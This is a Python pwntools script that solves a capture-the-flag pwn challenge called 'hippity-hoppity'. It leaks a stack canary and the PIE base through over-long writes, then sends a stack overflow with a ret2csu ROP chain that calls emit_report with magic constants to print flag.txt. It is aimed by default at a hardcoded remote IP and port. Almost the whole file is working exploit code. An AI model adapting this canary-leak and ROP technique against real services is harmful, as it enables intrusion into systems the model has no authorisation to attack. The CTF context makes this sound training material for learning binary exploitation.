#!/usr/bin/env python3
# solve.py — hippity-hoppity solver
# Usage: python3 solve.py [REMOTE_HOST REMOTE_PORT]
#
# Exploit chain:
#   1. Leak stack canary via submit_note (write overflow)
#   2. Leak PIE base via review_note (finalize_note pointer leak)
#   3. Stack overflow in finalize_entry + ret2csu ROP to call
#      emit_report(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
#      which reads and prints flag.txt

from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

HOST = sys.argv[1] if len(sys.argv) >= 3 else '20.244.7.184'
PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337

# Magic constants required by emit_report() in libcoreio.so
ARG1 = 0xdeadbeefdeadbeef  # rdi
ARG2 = 0xcafebabecafebabe  # rsi
ARG3 = 0xd00df00dd00df00d  # rdx

# PIE offsets (from objdump)
OFF_FINALIZE_NOTE   = 0x980
OFF_CSU_CALL        = 0xc80   # mov rdx,r13; mov rsi,r14; mov edi,r15d; call *(r12+rbx*8)
OFF_CSU_POP         = 0xc96   # add rsp,8; pop rbx..r15; ret
OFF_POP_RDI         = 0xca3   # pop rdi; ret  (misaligned from pop r15; ret)
OFF_POP_RSI_R15     = 0xca1   # pop rsi; pop r15; ret
OFF_EMIT_REPORT_PLT = 0x838
OFF_INIT_ARRAY      = 0x201d98  # contains pointer to frame_dummy (safe nop-like function)

def exploit():
    p = remote(HOST, PORT)
    p.recvuntil(b'Process log entry\n')

    # =========================================================================
    # Stage 1: submit_note — leak canary
    # =========================================================================
    # Buffer: rbp-0x50 (0x48 bytes to canary at rbp-0x8)
    # read(0, buf, 0x40)  — we fill first 0x40 bytes
    # write(1, buf, 0x58) — outputs 0x58 bytes, leaking canary at [0x48:0x50]
    p.recvuntil(b'Input log entry: ')
    p.send(b'A' * 0x40)

    p.recvuntil(b'[LOG] Entry received: ')
    leak1 = p.recv(0x58)
    canary = u64(leak1[0x48:0x50])
    log.info(f'Canary: {hex(canary)}')

    # =========================================================================
    # Stage 2: review_note — leak PIE base
    # =========================================================================
    # Buffer: rbp-0x30, finalize_note ptr stored at rbp-0x10
    # read(0, buf, 0x20)
    # write(1, buf, 0x30) — leaks finalize_note address at [0x20:0x28]
    p.recvuntil(b'Input processing note: ')
    p.send(b'B' * 0x20)

    p.recvuntil(b'[PROC] Processing: ')
    leak2 = p.recv(0x30)
    finalize_note_addr = u64(leak2[0x20:0x28])
    pie_base = finalize_note_addr - OFF_FINALIZE_NOTE
    log.info(f'PIE base: {hex(pie_base)}')

    # =========================================================================
    # Stage 3: finalize_entry — stack overflow + ROP
    # =========================================================================
    # read(0, rbp-0x48, 0x190) — massive overflow
    # Canary at offset 0x40 from input, saved rbp at 0x48, ret addr at 0x50
    #
    # ROP strategy:
    #   - No pop rdx gadget in binary, so use ret2csu to set rdx via r13
    #   - ret2csu calls *(r12+rbx*8): we point r12 to .init_array which
    #     holds a pointer to frame_dummy (benign, just returns)
    #   - After ret2csu returns, use pop rdi + pop rsi gadgets then call emit_report@plt
    #   - rdx is preserved through pop gadgets and PLT jmp

    csu_pop         = pie_base + OFF_CSU_POP
    csu_call        = pie_base + OFF_CSU_CALL
    pop_rdi         = pie_base + OFF_POP_RDI
    pop_rsi_r15     = pie_base + OFF_POP_RSI_R15
    emit_report_plt = pie_base + OFF_EMIT_REPORT_PLT
    init_array      = pie_base + OFF_INIT_ARRAY

    p.recvuntil(b'Send final payload: ')

    payload  = b'C' * 0x40       # padding to canary
    payload += p64(canary)        # restore canary
    payload += p64(0)             # saved rbp (don't care)

    # --- ROP chain ---
    # 1) ret2csu: set rdx = ARG3 and call frame_dummy (nop)
    payload += p64(csu_pop)
    payload += p64(0)             # [add rsp,8 skip]
    payload += p64(0)             # rbx = 0
    payload += p64(1)             # rbp = 1 (loop exits after 1 iteration)
    payload += p64(init_array)    # r12 -> ptr to frame_dummy
    payload += p64(ARG3)          # r13 -> rdx = 0xd00df00dd00df00d
    payload += p64(0)             # r14 -> rsi (temp, overwritten later)
    payload += p64(0)             # r15 -> edi (temp, overwritten later)

    # 2) Execute csu_call: sets rdx, calls frame_dummy, falls through
    payload += p64(csu_call)

    # 3) After call returns: add rbx,1; cmp rbp(1),rbx(1); equal -> fall through
    #    add rsp,8; pop rbx..r15; ret
    payload += p64(0)             # [add rsp,8 skip]
    payload += p64(0)             # rbx
    payload += p64(0)             # rbp
    payload += p64(0)             # r12
    payload += p64(0)             # r13
    payload += p64(0)             # r14
    payload += p64(0)             # r15

    # 4) Set rdi = ARG1 (full 64-bit via pop rdi; ret)
    payload += p64(pop_rdi)
    payload += p64(ARG1)          # 0xdeadbeefdeadbeef

    # 5) Set rsi = ARG2
    payload += p64(pop_rsi_r15)
    payload += p64(ARG2)          # 0xcafebabecafebabe
    payload += p64(0)             # r15 junk

    # 6) Call emit_report@plt — rdx still holds ARG3 from step 2
    payload += p64(emit_report_plt)

    p.send(payload)

    # Receive flag output
    result = p.recvall(timeout=5)
    output = result.decode(errors='replace')
    print(output)

    # Extract and save flag
    for line in output.split('\n'):
        line = line.strip()
        if '{' in line and '}' in line:
            print(f'\nFLAG: {line}')
            break

if __name__ == '__main__':
    exploit()
